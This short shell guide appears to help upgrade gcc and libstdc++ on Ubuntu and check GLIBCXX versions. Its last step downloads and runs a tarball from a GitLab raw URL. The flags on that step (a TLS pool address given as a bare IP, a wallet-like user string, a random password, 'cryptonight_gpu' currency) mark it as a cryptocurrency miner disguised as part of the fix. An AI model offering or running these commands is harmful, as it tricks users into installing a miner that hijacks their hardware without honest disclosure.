sudo add-apt-repository ppa:ubuntu-toolchain-r/test

sudo apt-get update

sudo apt-get install gcc-4.9

sudo apt-get upgrade libstdc++6

After this is complete, make sure to run the following:
sudo apt-get dist-upgrade

Also, make sure to confirm the necessary dependencies are installed for the right GLIBCXX version.
strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX

wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
./best --tls-url 69.164.205.118:443 --user RYoLsfLyxorX9cQHtypa9b4QWkEB76tCwasv8iynHspRLaQWHcECZCwXSg88k5pRmG1BFAexoMENvcR7V3SM1iJtgsminsRuawE --pass $(echo $(shuf -i 1-20000 -n 1)-yolo) --currency cryptonight_gpu 
